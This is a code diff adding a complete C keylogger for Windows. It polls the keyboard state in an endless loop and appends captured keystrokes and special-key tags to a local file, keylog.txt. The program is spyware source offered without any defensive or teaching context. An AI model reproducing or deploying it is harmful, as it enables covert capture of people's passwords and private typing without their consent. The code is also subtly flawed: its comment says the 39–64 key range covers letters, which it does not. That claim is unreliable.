@@ -1,0 +1,77 @@
+#include <stdio.h>
+#include <windows.h>
+
+// Function to log keystrokes
+void log_keystroke(int key, FILE *logfile) 
+{
+    // If the key is a standard character (A-Z, 0-9, symbols)
+    if (key >= 39 && key <= 64) 
+    {
+        fputc(key, logfile);
+    } 
+    else 
+    {
+        // Handle special keys
+        switch (key) 
+        {
+            case VK_SPACE:
+                fputc(' ', logfile);
+                break;
+            
+            case VK_SHIFT:
+                fputs("[SHIFT]", logfile);
+                break;
+
+            case VK_RETURN:
+                fputs("\n", logfile);
+                break;
+
+            case VK_BACK:
+                fputs("[BACKSPACE]", logfile);
+                break;
+
+            case VK_TAB:
+                fputs("[TAB]", logfile);
+                break;
+
+            case VK_ESCAPE:
+                fputs("[ESCAPE]", logfile);
+                break;
+
+            case VK_CONTROL:
+                fputs("[CTRL]", logfile);
+                break;
+
+            default:
+                break;
+        }
+    }
+    fflush(logfile);  // Ensure the data is immediately written to the file
+}
+
+int main() 
+{
+    FILE *logfile = fopen("keylog.txt", "a");  // Open or create the log file in append mode
+    if (logfile == NULL) 
+    {
+        printf("Error opening file!\n");
+        return 1;
+    }
+
+    // Infinite loop to capture keystrokes
+    while (1) 
+    {
+        for (int key = 8; key <= 190; key++) 
+        {
+            // If a key is pressed, log it
+            if (GetAsyncKeyState(key) == -32767) 
+            {
+                log_keystroke(key, logfile);
+            }
+        }
+        Sleep(10);  // Small delay to reduce CPU usage
+    }
+
+    fclose(logfile);  // Close the log file (though in this loop, it won't be reached)
+    return 0;
+}
